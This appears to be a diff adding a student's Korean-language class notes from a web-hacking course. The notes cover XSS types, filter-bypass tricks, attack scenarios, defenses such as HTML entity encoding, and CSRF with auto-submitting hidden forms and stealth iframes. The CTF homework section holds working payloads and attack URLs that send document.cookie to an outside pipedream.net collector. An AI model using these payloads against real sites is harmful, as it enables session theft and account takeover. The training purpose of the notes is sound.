@@ -120,8 +120,8 @@ SQL Injection 훈련
 
 ?>
 ---------------------------------------------------------------------
-
 5주차 수업
+
 <?php
 면접질문
 
@@ -213,12 +213,227 @@ alert('XSS')
 1. XSS 실전 해킹 - 여러가지 시나리오
 2. CTF - Session ID 탈취 방법
 
+ ?>
 
 
+ ---------------------------------------------------------------------
+ 6주차 수업
+	초봉: 3000 전후
+
+<?php
+1. Stored XSS
+	- HTML, DB
+
+2. Reflected XSS
+	- Link (URL)
+	* 공격 링크를 만들어라!
+
+3. DOM Based XSS
+	- 클라이언트 측에서 조립! / 잘 안나옴 / 찾기 힘듦
+	- document.write() / html, js 응답 분석
+
+- XSS Point : alert(1)
+
+
+
+-- XSS 필터링 우회
+1. Client Side 검증
+> 필터링을 js로 구현 / burp 인터셉트나, 개발자 Elements 코드 조작
+
+2. Black List 키워드 필터링
+(1) 대소문자 혼합 : Script
+(2) 키워드 반복 : <scrsctiptipt>alert(1):</scrscriptipt>
+-- xss without script, braket, quort
+
+3. Event Handler
+> 클릭, 화면에 띄워졌을 때, 마우스가 올라갔을 때, 에러가 났을때...
+
+<img src=~~~ onerror="alert('xss')">
+
+onmouseover
+onactivate
+onload
+<audio src="음악 파일 경로" onplay="alert(1);" autoplay;>
+
+div, object, svg
+
+* 예상 외 xss 포인트
+<script> 안에 있을 수도
+
+value에 입력값이 들어갈때
+<input name="title" value="pajji" onfocus="alert(1)" auto focus>
+
+----------------------------
+* 공격 시나리오
+1. Session 탈취
+</div><script>document.wirte('<img src="+document.cookie"/>');</script><div>
+
+2. HTML Injection
+
+3. Key Logger 삽입
+javascript keylogger
+
+4. Miner 실행 / 영상시청 사이트
+> javascript(xss) miner : 메모리 점유율
+
+5. Redirect (Phishing)
+<script>location.href="https://22222.com";</script>
+<script>location.replace("https://22222.com";)</script>
+
+-------------------------------------------------
+* 대응 방안
+> HTML 특수 문자를 HTML Entity 치환
+
+예외) HTML Editor
+> 에디터를 쓰지말자.. / 써야한다면..
+1. 사용자 입력에서 모든 HTML 특수 문자들을 HTML Entity로 치환
+2. 허용할 Tag, 화이트리스트 기반으로 허용할 태그들을 다시 복구
+3. 스크립트 실행이 가능한(제한해야할) Event Handler 블랙 리스트 기반으로 필터링
+
+---------------------------------------------------
+
+XSS CTF
+Session 탈취
+VPS
+
+<script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script>
+
+
+
+XSS
+_ alert('xss');
+
+* 과제
+1. normaltic.com XSS 문제 풀이
+1번 : http://normaltic.com:1018/xss_1/notice_read.php?id=52&view=1
+flag :
+
+2번 : http://normaltic.com:1018/xss_2/notice_list.php?option_val=username&board_result=aaa');location.replace("https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie);('&board_search=%F0%9F%94%8D&date_from=&date_to=
+flag :
+
+3번 : http://normaltic.com:1018/xss_3/mypage.php?user=%22/%3E%3Cscript%3Elocation.href=%22https://eoky46j4rt0f4na.m.pipedream.net/?%22%2bdocument.cookie;%3C/script%3E
+flag : segfault{XSS_Is_Mirror}
+
+4번(xss_5) : http://normaltic.com:1018/xss_5/notice_read.php?id=2&view=1
+flag :
+
+5번(xss_7) : http://normaltic.com:1018/xss_7/notice_update.php?id=42
+</textarea><script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script> <textarea>
+flag :
+
+6번(xss_6) : http://normaltic.com:1018/xss_6/notice_update.php?id=66
+flag :
+
+2. XSS 공격 연구 보고서
+
+
+제목 : 답안 제출
+내용 : 공격 URL
+
+
+
+------------------------------------------------
+1. 사고 안치는 사람
+2. 친밀한 사람?? 사교적인
+3. 꼼꼼함.
+
+<img src=x onmouseover="alert('xss')">
 
 
  ?>
 
+
+
+
+------------------------------------------------------
+7주차 수업
+<?php
+자격증
+1. 정보보안기사
+2. OSCP
+> 침투테스트 (pentest)
+
+* 모의해킹
+- 웹 해킹 프로젝트
+- 모바일 앱 해킹 프로젝트 / 안드로이드, ios
+- 침투테스트 프로젝트
+- OA 침투 + 와이파이 해킹
+
+
+---------------------------------------------------------
+
+* CSRF VS XSS ??
+> 피해자가 의도치 않게 웹 서버로 특정 요청을 하게 만드는 공격!
+
+"내 비밀번호를 1234로 바꿔줘"
+
+xss : 클라이언트 측 공격
+csrf : 서버 측 공격
+
+why??
+- 공격자가 요청을 예측하고 만들 수 있어서!
+
+> 링크를 못 만들게 한다.
+> 기존 비밀번호를 적으면 url에 포함되어 공격자가 pw를 몰라서 공격을 못하게 된다.
+
+> POST 방식이면 csrf 단독 공격 안된다.
+
+* POST Method
+> CSRF + XSS
+
+1. 무언가 바뀌어지는 페이지
+2. 바꾸는 요청 확인
+3. 입력값 위치 확인
+4. GET방식으로 전환
+5. POST 방식일 때 (xss 활용)
+- 다른 게시판에 form 태그 활용 method 변경
+
+--------------기본형식-------------------
+
+<form method="POST" action="url">
+	<input type="hidden" name="email" value="변경">
+	<input type="submit" value="Click Me">
+</form>
+
+-------------자동실행(document.forms)----------------
+
+<form method="POST" action="-">
+	<input type="hidden" name="email" value="normaltic@test.com">
+</form>
+<script>
+      document.forms[0].submit();
+</script>
+-------------버튼 가리기(iframe), 페이지 이동 강제(body onload)----------------
+
+
+<iframe width="0" heigth="0" border="0" name="stealthframe">
+</iframe>
+
+<body onload="document.csrf_form.submit();">
+<form method="POST" name="csrf_form" action="url" target="stealthframe">
+	<input type="hidden" name="email" value="example@test.com">
+</form>
+<script>
+	document.forms[0].submit();
+</script>
+
+https://0a6c006a034c4de9c04299ab00a90010.web-security-academy.net/my-account/change-email
+
+----------------post 일때 위 코드 사용-----------------
+* 과제
+
+1. GET Credential (xss_7)
+-> XSS 찾기! update 아님..
+
+2. CSRF
+- 개념 정리
+"https//portswigger.net/web-security/csrf/lab-no-defenses"
+(post mothod, 자동 전송, 스텥스폼)
+- 게시판 : 글쓰기, 마이페이지(비밀번호 바꾸기 csrf)
+
+3. 웹 개발
+
+?>
 
 
 
